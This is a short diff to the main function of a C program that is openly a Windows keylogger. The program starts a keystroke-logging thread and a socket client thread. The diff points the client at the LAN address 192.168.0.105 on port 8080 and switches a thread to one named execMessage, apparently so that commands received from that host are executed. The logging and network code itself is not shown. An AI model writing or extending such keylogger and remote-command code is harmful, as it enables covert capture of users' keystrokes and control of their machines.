@@ -17,7 +17,7 @@
 #include "keylogger.h"
 
 #define PORT 8080
-#define ADDRESS "127.0.0.1"
+#define ADDRESS "192.168.0.105"
 int main() {
 	paramThread param;
 
@@ -37,7 +37,7 @@ int main() {
 	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
 	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)&param, 0, &cliSocketId);
 	//sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
-	execMSG = CreateThread(NULL, 0, getMessage, (LPVOID)&param, 0, &execMSGId);
+	execMSG = CreateThread(NULL, 0, execMessage, (LPVOID)&param, 0, &execMSGId);
 
 
 	WaitForSingleObject(cliSocket, INFINITE);
